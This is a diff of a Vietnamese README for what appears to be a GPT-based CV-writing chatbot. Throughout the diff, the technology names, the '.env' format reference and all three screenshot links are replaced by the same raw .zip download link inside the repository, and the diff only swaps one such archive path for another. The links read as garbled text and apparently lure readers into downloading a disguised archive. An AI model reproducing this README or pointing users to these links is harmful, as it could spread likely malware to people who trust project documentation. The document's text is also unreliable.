@@ -41,15 +41,15 @@
 
 ## Công nghệ sử dụng
 
-- **Frontend:** https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip (React), Tailwind CSS
-- **Backend:** API nội bộ tích hợp trong https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip
+- **Frontend:** https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip (React), Tailwind CSS
+- **Backend:** API nội bộ tích hợp trong https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip
 - **AI:** OpenAI GPT (gpt-4.0-mini)
 - **Thư viện khác:** react-to-print, prompt engineering
 
 ## Kiến trúc hệ thống
 
 Ứng dụng sử dụng mô hình **Client–Server tích hợp**:
-- Giao diện người dùng: Xây dựng bằng https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip với khả năng SSR/SSG.
+- Giao diện người dùng: Xây dựng bằng https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip với khả năng SSR/SSG.
 - API nội bộ: Nhận yêu cầu từ frontend, dựng prompt, gọi OpenAI API.
 - AI as a Service: Sử dụng GPT để sinh văn bản.
 
@@ -88,7 +88,7 @@
     ```bash
     npm install
     ```
-2. Add ".env" file with format same as "https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip"
+2. Add ".env" file with format same as "https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip"
 ## Run application
 - Dev mode
     ```bash
@@ -102,6 +102,6 @@
 
 ## Preview Images
 
-![Project Screenshot](https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip)
-![Project Screenshot](https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip)
-![Project Screenshot](https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/app/api/profile/BO-C-LLM-v1.0-alpha.4.zip)
+![Project Screenshot](https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip)
+![Project Screenshot](https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip)
+![Project Screenshot](https://github.com/VHoangNguyen0102/CV-BOT-LLM/raw/refs/heads/main/src/components/C_LLM_BO_1.7.zip)
